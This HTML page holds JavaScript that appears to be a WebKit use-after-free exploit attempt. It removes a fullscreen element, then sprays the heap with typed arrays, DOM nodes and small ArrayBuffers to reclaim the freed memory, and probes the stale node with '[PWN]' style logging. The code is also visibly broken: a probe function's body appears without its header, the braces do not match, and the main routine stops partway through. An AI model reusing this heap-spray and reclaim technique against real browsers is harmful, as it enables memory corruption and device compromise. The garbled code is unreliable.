<!DOCTYPE html>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
function setupHeap() {
    let controllers = [];
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }
    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 RECLAIM + SMALL SPRAY
function preciseReclaim(size) {
    log("[*] Reclaim size = " + size);

    let bucket = [];

    // churn leve
    for (let i = 0; i < 2000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // spray DOM
    for (let i = 0; i < size; i++) {
        let el = document.createElement("div");
        el.innerHTML = "<h1>CONTROL_" + i + "</h1>";
        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔥 SMALL ArrayBuffer spray (ALINHADO)
    let ab = [];
    for (let i = 0; i < 6000; i++) {
        let buf = new ArrayBuffer(0x40);
        let view = new Uint8Array(buf);

        view[0] = 0x41;
        view[1] = 0x42;
        view[2] = 0x43;
        view[3] = 0x44;

        ab.push(view);
    }

    return bucket;
}

            let newChild = fsTarget.firstChild;

            log("[CHECK] newChild = " + newChild);

            if (newChild) {
                log("[CHECK] tag = " + newChild.tagName);
                log("[CHECK] nodeType = " + newChild.nodeType);

                try {
                    log("[CHECK] instanceof HTMLElement = " + (newChild instanceof HTMLElement));
                } catch(e) {}

                    log("[CHECK] instanceof SVGElement = " + (newChild instanceof SVGElement));

                    newChild.innerHTML = "TEST";
                    log("[CHECK] write OK");
                } catch(e) {

            }

    } catch(e) {
        log("[PWN] erro geral");
    }

    try { log("[CHECK] parent = " + fsTarget.parentNode); } catch(e){}
}

// ==========================
// TRIGGER (INALTERADO)
function trigger(fsTarget) {
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e) {
        log("[ERRO]");
    }

    let sizes = [1500, 2000, 2500, 3000];

    sizes.forEach((size, idx) => {
        setTimeout(() => preciseReclaim(size), idx * 50);
    });

    setTimeout(() => probe(fsTarget), 20);
    setTimeout(() => probe(fsTarget), 100);
    setTimeout(() => probe(fsTarget), 180);
    setTimeout(() => probe(fsTarget), 260);

    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

}

// ==========================
// MAIN (INALTERADO)
function runTest() {
    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

</script>
